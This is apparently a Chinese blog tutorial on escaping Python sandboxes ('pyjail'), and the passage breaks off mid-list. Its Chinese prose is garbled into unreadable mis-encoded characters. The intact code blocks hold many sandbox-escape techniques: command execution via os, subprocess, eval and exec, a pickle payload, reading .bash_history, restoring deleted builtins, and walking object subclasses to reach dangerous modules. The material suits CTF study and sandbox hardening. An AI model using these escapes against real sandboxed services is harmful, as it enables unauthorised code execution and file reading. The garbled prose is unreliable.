<li>äº†è§£pyjailçš„æ¦‚å¿µï¼špyjailæ˜¯ä¸€ç§é™åˆ¶Pythonä»£ç æ‰§è¡Œçš„æŠ€æœ¯ï¼Œç”¨äºé˜²æ­¢æ¶æ„ä»£ç å¯¹ç³»ç»Ÿé€ æˆæŸå®³ã€‚</li>
<li>é˜…è¯»pyjailç›¸å…³æ–‡æ¡£å’Œæ•™ç¨‹ï¼šé€šè¿‡é˜…è¯»å®˜æ–¹æ–‡æ¡£ã€åšå®¢å’Œæ•™ç¨‹ï¼Œäº†è§£pyjailçš„å·¥ä½œåŸç†å’Œå¦‚ä½•ä½¿ç”¨å®ƒã€‚</li>
<li>å®é™…æ“ä½œï¼šä½¿ç”¨pyjailè¿›è¡Œä»£ç é™åˆ¶ï¼Œå¹¶å°è¯•ç»•è¿‡é™åˆ¶ï¼Œä»¥æ·±å…¥äº†è§£å®ƒçš„å·¥ä½œåŸç†ã€‚</li>
<li>å‚ä¸ç¤¾åŒºï¼šåŠ å…¥pyjailçš„å¼€å‘è€…ç¤¾åŒºï¼Œä¸å…¶ä»–å¼€å‘è€…è¿›è¡Œäº¤æµï¼Œå…±åŒå­¦ä¹ å’Œå‘å±•ã€‚</li>
</ol>
<h3 id="å»å“ªå­¦pyjail"><a class="markdownIt-Anchor" href="#å»å“ªå­¦pyjail"></a> å»å“ªå­¦pyjailï¼Ÿ</h3>
<ol>
<li>Githubï¼šå¯ä»¥åœ¨pyjailçš„Githubé¡µé¢ä¸Šæäº¤é—®é¢˜ï¼Œæäº¤ä»£ç ï¼Œå¹¶ä¸å…¶ä»–å¼€å‘è€…è¿›è¡Œäº¤æµã€‚</li>
<li>Stack Overflowï¼šå¯ä»¥åœ¨Stack Overflowä¸Šæé—®ï¼Œè·å¾—å…³äºpyjailçš„æŠ€æœ¯æ”¯æŒã€‚</li>
<li>å¼€æºè®ºå›ï¼šå¯ä»¥åœ¨å¼€æºè®ºå›ä¸Šäº†è§£æœ‰å…³pyjailçš„æœ€æ–°åŠ¨æ€ï¼Œä¸å…¶ä»–å¼€å‘è€…è¿›è¡Œäº¤æµã€‚</li>
<li>åœ¨çº¿ä¼šè®®ï¼šå¯ä»¥å‚åŠ ä¸pyjailç›¸å…³çš„åœ¨çº¿ä¼šè®®ï¼Œä¸å…¶ä»–å¼€å‘è€…é¢å¯¹é¢äº¤æµã€‚</li>
</ol>
<h2 id="æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"><a class="markdownIt-Anchor" href="#æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"></a> æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</h2>
<h3 id="å¯¼å…¥æ¨¡å—"><a class="markdownIt-Anchor" href="#å¯¼å…¥æ¨¡å—"></a> ã€å¯¼å…¥æ¨¡å—ã€‘</h3>
<p>åœ¨pythonä¸­å¯¼å…¥æ¨¡å—ï¼Œæœ‰è¿™æ ·çš„ä¸€ä¸ªæµç¨‹ï¼š</p>
<blockquote>
<p>Pythonå¯¼å…¥æ¨¡å—æ—¶ï¼Œä¼šå…ˆåˆ¤æ–­<code>sys.modules</code>æ˜¯å¦å·²ç»åŠ è½½äº†è¯¥æ¨¡å—ï¼Œå¦‚æœæ²¡æœ‰åŠ è½½åˆ™ä»<code>sys.path</code>ä¸­çš„ç›®å½•æŒ‰ç…§æ¨¡å—åæŸ¥æ‰¾<code>py</code>ã€<code>pyc</code>ã€<code>pyd</code>æ–‡ä»¶ï¼Œæ‰¾åˆ°åæ‰§è¡Œè¯¥æ–‡ä»¶è½½å…¥å†…å­˜å¹¶æ·»åŠ è‡³<code>sys.modules</code>ä¸­ï¼Œå†å°†æ¨¡å—åç§°å¯¼å…¥Localå‘½åç©ºé—´ã€‚å¦‚æœ<code>a.py</code>ä¸­å­˜åœ¨<code>import b</code>ï¼Œåˆ™åœ¨<code>import a</code>æ—¶<code>ab</code>ä¸¤ä¸ªæ¨¡å—éƒ½ä¼šæ·»åŠ è‡³<code>sys.modules</code>ä¸­ï¼Œä½†ä»…å°†<code>a</code>å¯¼å…¥Localå‘½åç©ºé—´ã€‚é€šè¿‡<code>from x import y</code>æ—¶ï¼Œåˆ™å°†<code>x</code>æ·»åŠ è‡³<code>sys.modules</code>ä¸­ï¼Œå°†<code>y</code>å¯¼å…¥Localå‘½åç©ºé—´ã€‚</p>
</blockquote>
<p>é™¤äº†è¿™ä¸ªå¸¸è§„å¯¼å…¥æ¨¡å—çš„æ–¹å¼å¤–è¿˜å¯ä»¥æ‰‹åŠ¨æ·»åŠ ã€ç›´æ¥æ‰§è¡Œç­‰æ–¹å¼å¯¼å…¥æ¨¡å—ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> xxx</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> xxx <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;xxx&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.modules[<span class="string">&#x27;xxx&#x27;</span>]=<span class="string">&#x27;blacklist&#x27;</span></span><br><span class="line"><span class="keyword">del</span> sys.modules[<span class="string">&#x27;xxx&#x27;</span>]</span><br><span class="line"><span class="keyword">import</span> xxx</span><br><span class="line"></span><br><span class="line">a = <span class="built_in">open</span>(<span class="string">&#x27;/usr/lib/python3.9/xxx.py&#x27;</span>).read()</span><br><span class="line"><span class="built_in">exec</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">execfile(<span class="string">&#x27;/usr/lib/python2.8/xxx.py&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="å±é™©æ–¹æ³•"><a class="markdownIt-Anchor" href="#å±é™©æ–¹æ³•"></a> å±é™©æ–¹æ³•</h3>
<p>æœ‰å¾ˆå¤šæ¨¡å—å’Œæ–¹æ³•å¯ä»¥ç”¨äºæ‰§è¡Œå‘½ä»¤æˆ–è€…è¯»å–æ–‡ä»¶ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">os.system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">os.popen(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">os.popen2(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br><span class="line">os.popen3(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">subprocess.call(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.check_call(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.check_output(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.Popen(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># Python3</span></span><br><span class="line">subprocess.run(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.getoutput(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">subprocess.getstatusoutput(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"></span><br><span class="line">platform.popen(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">commands.getoutput(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">commands.getstatusoutput(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"></span><br><span class="line">timeit.timeit(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>, number=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">bdb.os.system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cgi.os.system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"></span><br><span class="line">importlib.import_module(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"><span class="comment"># Python3</span></span><br><span class="line">importlib.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pickle.loads(<span class="string">b&quot;cos\nsystem\n(S&#x27;whoami&#x27;\ntR.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)</span><br><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)</span><br><span class="line"><span class="built_in">exec</span>(<span class="built_in">compile</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Linux</span></span><br><span class="line">pty.spawn(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">pty.os.system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ–‡ä»¶æ“ä½œ</span></span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;.bash_history&#x27;</span>).read()</span><br><span class="line">linecache.getlines(<span class="string">&#x27;.bash_history&#x27;</span>)</span><br><span class="line">codecs.<span class="built_in">open</span>(<span class="string">&#x27;.bash_history&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">file(<span class="string">&#x27;.bash_history&#x27;</span>).read()</span><br><span class="line">types.FileType(<span class="string">&#x27;.bash_history&#x27;</span>).read()</span><br><span class="line">commands.getstatus(<span class="string">&#x27;.bash_history&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># å‡½æ•°å‚æ•°</span></span><br><span class="line">foo.__code__.co_argcount</span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">foo.func_code.co_argcount</span><br><span class="line"></span><br><span class="line"><span class="comment"># å‡½æ•°å­—èŠ‚ç </span></span><br><span class="line">foo.__code__.co_code</span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">foo.func_code.co_code</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h3 id="é‡æ–°å¯¼å…¥"><a class="markdownIt-Anchor" href="#é‡æ–°å¯¼å…¥"></a> é‡æ–°å¯¼å…¥</h3>
<p>Pythonå°†ä¸€äº›ç»å¸¸ç”¨åˆ°çš„å‡½æ•°æ”¾åœ¨äº†<code>å†…å»ºæ¨¡å—</code>ä¸­ï¼Œè¿™äº›å‡½æ•°æ— éœ€å¯¼å…¥å³å¯ä½¿ç”¨ï¼ˆæ¯”å¦‚<code>eval</code>ã€<code>open</code>ï¼‰ï¼Œè¿™ä¸ªå†…å»ºæ¨¡å—åœ¨Python2ä¸­å«ä½œ<code>__builtin__</code>ã€åœ¨Python3ä¸­å«ä½œ<code>builtins</code>ï¼Œè¿™ä¸¤ä¸ªéƒ½éœ€è¦å¯¼å…¥æ‰å¯ä»¥å¼•ç”¨ï¼Œä½†å¯ä»¥é€šè¿‡<code>__builtins__</code>æ¥é—´æ¥å¼•ç”¨è€Œæ— éœ€å¯¼å…¥ï¼ˆæœ‰ä¸€ç‚¹åŒºåˆ«ï¼Œä½†é—®é¢˜ä¸å¤§ï¼‰ã€‚</p>
<p>ä¸€äº›ç¯å¢ƒå‡ºäºå®‰å…¨è€ƒè™‘ä¼šåˆ æ‰<code>å†…å»ºæ¨¡å—</code>ä¸­çš„å±é™©æ–¹æ³•ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;__import__&#x27;</span>]</span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;exec&#x27;</span>]</span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;execfile&#x27;</span>]</span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;getattr&#x27;</span>]</span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;input&#x27;</span>]</span><br></pre></td></tr></table></figure>
<p>è¿™æ—¶å¯ä»¥å°è¯•é‡æ–°å¯¼å…¥<code>å†…å»ºæ¨¡å—</code>ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">imp.reload(__builtins__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">reload(__builtins__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¹Ÿå¯ç”¨ä½œé¦–æ¬¡å¯¼å…¥</span></span><br></pre></td></tr></table></figure>
<p>ä½†æ˜¯Python2çš„<code>reload</code>ä¹Ÿæ˜¯å†…å»ºæ¨¡å—ï¼Œå¯ä»¥é€šè¿‡<code>del __builtins__.reload</code>åˆ æ‰ã€‚</p>
<h2 id="builtins-builtin__ä¸__builtins"><a class="markdownIt-Anchor" href="#builtins-builtin__ä¸__builtins"></a> builtinsã€<strong>builtin__ä¸__builtins</strong></h2>
<p>å…ˆè¯´ä¸€ä¸‹ï¼Œ<code>builtin</code>ã€<code>builtins</code>ï¼Œ<code>__builtin__</code>ä¸<code>__builtins__</code>çš„åŒºåˆ«ï¼š<br>
é¦–å…ˆæˆ‘ä»¬çŸ¥é“ï¼Œåœ¨ Python ä¸­ï¼Œæœ‰å¾ˆå¤šå‡½æ•°ä¸éœ€è¦ä»»ä½• import å°±å¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œä¾‹å¦‚<code>chr</code>ã€<code>open</code>ã€‚ä¹‹æ‰€ä»¥å¯ä»¥è¿™æ ·ï¼Œæ˜¯å› ä¸º Python æœ‰ä¸ªå«<code>å†…å»ºæ¨¡å—</code>ï¼ˆæˆ–è€…å«å†…å»ºå‘½åç©ºé—´ï¼‰çš„ä¸œè¥¿ï¼Œå®ƒæœ‰ä¸€äº›å¸¸ç”¨å‡½æ•°ï¼Œå˜é‡å’Œç±»ã€‚é¡ºä¾¿è¯´ä¸€ä¸‹ï¼ŒPython å¯¹å‡½æ•°ã€å˜é‡ã€ç±»ç­‰ç­‰çš„æŸ¥æ‰¾æ–¹å¼æ˜¯æŒ‰ <code>LEGB</code> è§„åˆ™æ¥æ‰¾çš„ï¼Œå…¶ä¸­ B å³ä»£è¡¨å†…å»ºæ¨¡å—ï¼Œè¿™é‡Œä¹Ÿä¸å†èµ˜è¿°äº†ï¼Œæœ‰å…´è¶£çš„æœæœå°±æ˜ç™½äº†ã€‚</p>
<p>åœ¨ 2.x ç‰ˆæœ¬ä¸­ï¼Œå†…å»ºæ¨¡å—è¢«å‘½åä¸º <code>__builtin__</code>ï¼Œåˆ°äº† 3.x å°±æˆäº† <code>builtins</code>ã€‚å®ƒä»¬éƒ½éœ€è¦ import æ‰èƒ½æŸ¥çœ‹ï¼š<br>
2.xï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> __builtin__</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtin__</span><br><span class="line">&lt;module <span class="string">&#x27;__builtin__&#x27;</span> (built-<span class="keyword">in</span>)&gt;</span><br></pre></td></tr></table></figure>
<p>3.xï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> builtins</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>builtins</span><br><span class="line">&lt;module <span class="string">&#x27;builtins&#x27;</span> (built-<span class="keyword">in</span>)&gt;</span><br></pre></td></tr></table></figure>
<p>ä½†æ˜¯ï¼Œ<code>__builtins__</code> ä¸¤è€…éƒ½æœ‰ï¼Œå®é™…ä¸Šæ˜¯<code>__builtin__</code>å’Œ<code>builtins</code> çš„å¼•ç”¨ã€‚å®ƒä¸éœ€è¦å¯¼å…¥ï¼Œæˆ‘ä¼°è®¡æ˜¯ä¸ºäº†ç»Ÿä¸€ 2.x å’Œ 3.xã€‚ä¸è¿‡<code>__builtins__</code>ä¸<code>__builtin__</code>å’Œ<code>builtins</code>æ˜¯æœ‰ä¸€ç‚¹åŒºåˆ«çš„ï¼Œæ„Ÿå…´è¶£çš„è¯å»ºè®®æŸ¥ä¸€ä¸‹ï¼Œè¿™é‡Œå°±ä¸å•°å—¦äº†ã€‚ä¸ç®¡æ€ä¹ˆæ ·ï¼Œ<code>__builtins__</code> ç›¸å¯¹å®ç”¨ä¸€ç‚¹ï¼Œå¹¶ä¸”åœ¨ <code>__builtins__</code>é‡Œæœ‰å¾ˆå¤šå¥½ä¸œè¥¿ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;__import__&#x27;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(__builtins__)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">macr0phag3</span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(__builtins__)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;execfile&#x27;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(__builtins__)</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œç¨å¾®è§£é‡Šä¸‹ <code>x.__dict__</code> ï¼Œå®ƒæ˜¯ x å†…éƒ¨æ‰€æœ‰å±æ€§åå’Œå±æ€§å€¼ç»„æˆçš„å­—å…¸ï¼Œæœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š</p>
<ol>
<li>å†…ç½®çš„æ•°æ®ç±»å‹æ²¡æœ‰ <code>__dict__</code> å±æ€§</li>
<li>æ¯ä¸ªç±»æœ‰è‡ªå·±çš„ <code>__dict__</code> å±æ€§ï¼Œå°±ç®—å­˜ç€ç»§æ‰¿å…³ç³»ï¼Œçˆ¶ç±»çš„ <code>__dict__</code> å¹¶ä¸ä¼šå½±å“å­ç±»çš„ <code>__dict__</code></li>
<li>å¯¹è±¡ä¹Ÿæœ‰è‡ªå·±çš„ <code>__dict__</code> å±æ€§ï¼ŒåŒ…å« <code>self.xxx</code> è¿™ç§å®ä¾‹å±æ€§</li>
</ol>
<p>é‚£ä¹ˆæ—¢ç„¶<code>__builtins__</code>æœ‰è¿™ä¹ˆå¤šå±é™©çš„å‡½æ•°ï¼Œä¸å¦‚å°†é‡Œé¢çš„å±é™©å‡½æ•°ç ´åäº†ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>] = <span class="string">&#x27;not allowed&#x27;</span></span><br></pre></td></tr></table></figure>
<p>æˆ–è€…ç›´æ¥åˆ äº†ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span><br></pre></td></tr></table></figure>
<p>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ <code>reload(__builtins__)</code> æ¥æ¢å¤ <code>__builtins__</code>ã€‚ä¸è¿‡ï¼Œæˆ‘ä»¬åœ¨ä½¿ç”¨ <code>reload</code> çš„æ—¶å€™ä¹Ÿæ²¡å¯¼å…¥ï¼Œè¯´æ˜ <code>reload</code>ä¹Ÿåœ¨ <code>__builtins__</code>é‡Œï¼Œé‚£å¦‚æœè¿<code>reload</code>éƒ½ä»<code>__builtins__</code>ä¸­åˆ äº†ï¼Œå°±æ²¡æ³•æ¢å¤<code>__builtins__</code>äº†ï¼Œéœ€è¦å¦å¯»ä»–æ³•ã€‚è¿˜æœ‰ä¸€ç§æƒ…å†µæ˜¯åˆ©ç”¨ <code>exec command in _global</code> åŠ¨æ€è¿è¡Œè¯­å¥æ—¶çš„ç»•è¿‡ï¼Œæ¯”å¦‚å®ç°ä¸€ä¸ªè®¡ç®—å™¨çš„æ—¶å€™ï¼Œåœ¨æœ€åæœ‰ç»™å‡ºä¾‹å­ã€‚</p>
<p>è¿™é‡Œæ³¨æ„ï¼Œ2.x çš„ <code>reload</code> æ˜¯å†…å»ºçš„ï¼Œ3.x éœ€è¦ <code>import imp</code>ï¼Œç„¶åå† <code>imp.reload</code></p>
<h2 id="æ„é€ é€ƒé€¸é“¾"><a class="markdownIt-Anchor" href="#æ„é€ é€ƒé€¸é“¾"></a> æ„é€ é€ƒé€¸é“¾</h2>
<p>å¯¹äº<code>a</code>æ¨¡å—åµŒå¥—å¯¼å…¥çš„<code>b</code>æ¨¡å—ä¸­å¯¼å…¥çš„<code>xxx</code>æ¨¡å—ï¼Œå¯ä»¥é€šè¿‡<code>a.b.xxx</code>çš„æ–¹å¼æ¥å¼•ç”¨ã€‚å¦‚æœæ ‡å‡†åº“ä¸­åµŒå¥—å¯¼å…¥äº†å±é™©æ¨¡å—åˆ™ä¼šæˆä¸ºä¸€ä¸ªæ½œåœ¨é£é™©ï¼Œä½†æ˜¯æ ‡å‡†åº“ä¹Ÿæ˜¯éœ€è¦å…ˆå¯¼å…¥æ‰èƒ½ç”¨çš„ï¼Œå¦‚ä½•æ‰èƒ½æ‰“ç ´åƒµå±€è®©æ½œåœ¨é£é™©å¯è¢«åˆ©ç”¨å‘¢ï¼Ÿ</p>
<p>åœ¨Python3ä¸­æ‰€æœ‰çš„ç±»éƒ½é»˜è®¤ç»§æ‰¿è‡ª<code>object</code>ç±»ã€ç»§æ‰¿<code>object</code>çš„å…¨éƒ¨æ–¹æ³•ï¼Œåœ¨Python2ä¸­ç±»é»˜è®¤ä¸º<code>classobj</code>ï¼Œåªæœ‰<code>['__doc__', '__module__']</code>ä¸¤ä¸ªæ–¹æ³•ï¼Œé™¤éæ˜¾å¼å£°æ˜ç»§æ‰¿è‡ª<code>object</code>ç±»ã€‚</p>
<p>æ€è·¯ä¸€ï¼šå¦‚æœ<code>object</code>çš„æŸä¸ªæ´¾ç”Ÿç±»ä¸­å­˜åœ¨å±é™©æ–¹æ³•ï¼Œå°±å¯ä»¥ç›´æ¥æ‹¿æ¥ç”¨</p>
<p>æ€è·¯äºŒï¼šå¦‚æœ<code>object</code>çš„æŸä¸ªæ´¾ç”Ÿç±»å¯¼å…¥äº†å±é™©æ¨¡å—ï¼Œå°±å¯ä»¥é“¾å¼è°ƒç”¨å±é™©æ–¹æ³•</p>
<p>æ€è·¯ä¸‰ï¼šå¦‚æœ<code>object</code>çš„æŸä¸ªæ´¾ç”Ÿç±»ç”±äºå¯¼å…¥äº†æŸäº›æ ‡å‡†åº“æ¨¡å—ï¼Œä»è€Œé—´æ¥å¯¼å…¥äº†å±é™©æ¨¡å—çš„å±é™©æ–¹æ³•ï¼Œä¹Ÿå¯ä»¥é€šè¿‡é“¾å¼è°ƒç”¨</p>
<p>æ€è·¯å››ï¼šåŸºæœ¬ç±»å‹çš„æŸäº›æ–¹æ³•å±äºç‰¹æ®Šæ–¹æ³•ï¼Œå¯ä»¥é€šè¿‡é“¾å¼è°ƒç”¨</p>
<h3 id="è·å–objectç±»"><a class="markdownIt-Anchor" href="#è·å–objectç±»"></a> è·å–objectç±»</h3>
<p>Pythonå»ºè®®ç±»çš„protectedç±»å‹ã€privateç±»å‹åŠå†…éƒ¨å˜é‡åˆ†åˆ«ä»¥<code>_xxx</code>ã€<code>__yyy</code>ã€<code>__zzz__</code>çš„å½¢å¼å‘½åï¼Œä½†è¿™ä»…æ˜¯ä¸€ç§ä»£ç é£æ ¼è§„èŒƒï¼Œå¹¶æœªåœ¨è¯­è¨€å±‚é¢ä½œä»»ä½•é™åˆ¶ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">object</span></span><br><span class="line"></span><br><span class="line">[].__class__.__base__</span><br><span class="line">().__class__.__base__</span><br><span class="line">&#123;&#125;.__class__.__base__</span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">&#123;&#125;.__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">[].__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">().__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">&#123;&#125;.__class__.__mro__[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python3</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__base__</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸‹æ ‡å¯ä»¥ç”¨è´Ÿæ•°æ¥å€’æ•°</span></span><br></pre></td></tr></table></figure>
<h3 id="éå†æ´¾ç”Ÿç±»"><a class="markdownIt-Anchor" href="#éå†æ´¾ç”Ÿç±»"></a> éå†æ´¾ç”Ÿç±»</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># https://github.com/python/cpython/tree/2.7/Lib</span></span><br><span class="line"><span class="comment"># ls -l /usr/lib/python2.7 | awk &#x27;&#123;print$9&#125;&#x27; | grep -v &#x27;.pyc\|this\|antigravity&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Python2æ ‡å‡†åº“æ¨¡å—</span></span><br><span class="line">modules2 = [<span class="string">&#x27;_abcoll&#x27;</span>, <span class="string">&#x27;abc&#x27;</span>, <span class="string">&#x27;aifc&#x27;</span>, <span class="string">&#x27;anydbm&#x27;</span>, <span class="string">&#x27;argparse.egg-info&#x27;</span>, <span class="string">&#x27;argparse&#x27;</span>, <span class="string">&#x27;ast&#x27;</span>, <span class="string">&#x27;asynchat&#x27;</span>, <span class="string">&#x27;asyncore&#x27;</span>, <span class="string">&#x27;atexit&#x27;</span>, <span class="string">&#x27;audiodev&#x27;</span>, <span class="string">&#x27;base64&#x27;</span>, <span class="string">&#x27;BaseHTTPServer&#x27;</span>, <span class="string">&#x27;Bastion&#x27;</span>, <span class="string">&#x27;bdb&#x27;</span>, <span class="string">&#x27;binhex&#x27;</span>, <span class="string">&#x27;bisect&#x27;</span>, <span class="string">&#x27;bsddb&#x27;</span>, <span class="string">&#x27;calendar&#x27;</span>, <span class="string">&#x27;CGIHTTPServer&#x27;</span>, <span class="string">&#x27;cgi&#x27;</span>, <span class="string">&#x27;cgitb&#x27;</span>, <span class="string">&#x27;chunk&#x27;</span>, <span class="string">&#x27;cmd&#x27;</span>, <span class="string">&#x27;codecs&#x27;</span>, <span class="string">&#x27;codeop&#x27;</span>, <span class="string">&#x27;code&#x27;</span>, <span class="string">&#x27;collections&#x27;</span>, <span class="string">&#x27;colorsys&#x27;</span>, <span class="string">&#x27;commands&#x27;</span>, <span class="string">&#x27;compileall&#x27;</span>, <span class="string">&#x27;compiler&#x27;</span>, <span class="string">&#x27;ConfigParser&#x27;</span>, <span class="string">&#x27;config-x86_64-linux-gnu&#x27;</span>, <span class="string">&#x27;contextlib&#x27;</span>, <span class="string">&#x27;cookielib&#x27;</span>, <span class="string">&#x27;Cookie&#x27;</span>, <span class="string">&#x27;copy&#x27;</span>, <span class="string">&#x27;copy_reg&#x27;</span>, <span class="string">&#x27;cProfile&#x27;</span>, <span class="string">&#x27;csv&#x27;</span>, <span class="string">&#x27;ctypes&#x27;</span>, <span class="string">&#x27;curses&#x27;</span>, <span class="string">&#x27;dbhash&#x27;</span>, <span class="string">&#x27;decimal&#x27;</span>, <span class="string">&#x27;difflib&#x27;</span>, <span class="string">&#x27;dircache&#x27;</span>, <span class="string">&#x27;dis&#x27;</span>, <span class="string">&#x27;dist-packages&#x27;</span>, <span class="string">&#x27;distutils&#x27;</span>, <span class="string">&#x27;doctest&#x27;</span>, <span class="string">&#x27;DocXMLRPCServer&#x27;</span>, <span class="string">&#x27;dumbdbm&#x27;</span>, <span class="string">&#x27;dummy_threading&#x27;</span>, <span class="string">&#x27;dummy_thread&#x27;</span>, <span class="string">&#x27;email&#x27;</span>, <span class="string">&#x27;encodings&#x27;</span>, <span class="string">&#x27;ensurepip&#x27;</span>, <span class="string">&#x27;filecmp&#x27;</span>, <span class="string">&#x27;fileinput&#x27;</span>, <span class="string">&#x27;fnmatch&#x27;</span>, <span class="string">&#x27;formatter&#x27;</span>, <span class="string">&#x27;fpformat&#x27;</span>, <span class="string">&#x27;fractions&#x27;</span>, <span class="string">&#x27;ftplib&#x27;</span>, <span class="string">&#x27;functools&#x27;</span>, <span class="string">&#x27;__future__&#x27;</span>, <span 